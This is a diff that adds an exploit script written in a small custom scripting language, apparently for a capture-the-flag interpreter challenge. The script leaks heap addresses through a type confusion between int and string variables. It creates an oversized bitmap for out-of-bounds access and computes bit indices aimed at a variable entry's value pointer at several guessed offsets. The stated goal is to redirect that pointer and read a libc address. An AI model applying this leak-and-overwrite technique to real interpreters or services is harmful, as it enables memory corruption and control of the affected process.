@@ -1,0 +1,64 @@
+print("=== Test Different value_ptr Offsets ===");
+
+print("Step 1: Leak addresses");
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+print("addr1:");
+print(addr1);
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("targetaddr:");
+print(targetaddr);
+
+print("Step 2: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 3: Test different value_ptr offsets");
+print("Variable entry is 0x40 bytes");
+print("value_ptr might be at different offsets");
+
+int entryaddr = targetaddr - 768;
+int bitmapptr = addr1 - 4096;
+int baseoffset = entryaddr - bitmapptr;
+int basebitindex = baseoffset * 8;
+
+print("Base entryaddr offset from bitmap:");
+print(baseoffset);
+print("Base bit_index:");
+print(basebitindex);
+
+print("Test 1: value_ptr at offset 0x20 (32)");
+int valueptr1 = entryaddr + 32;
+int offset1 = valueptr1 - bitmapptr;
+int bitindex1 = offset1 * 8;
+print("bit_index1:");
+print(bitindex1);
+
+print("Test 2: value_ptr at offset 0x28 (40) - current");
+int valueptr2 = entryaddr + 40;
+int offset2 = valueptr2 - bitmapptr;
+int bitindex2 = offset2 * 8;
+print("bit_index2:");
+print(bitindex2);
+
+print("Test 3: value_ptr at offset 0x30 (48)");
+int valueptr3 = entryaddr + 48;
+int offset3 = valueptr3 - bitmapptr;
+int bitindex3 = offset3 * 8;
+print("bit_index3:");
+print(bitindex3);
+
+print("Test 4: value_ptr at offset 0x18 (24)");
+int valueptr4 = entryaddr + 24;
+int offset4 = valueptr4 - bitmapptr;
+int bitindex4 = offset4 * 8;
+print("bit_index4:");
+print(bitindex4);
+
+print("Step 4: Write test value to each offset");
+print("Then check if target address changes");
+print("The one that works will show libc address when reading target");
+
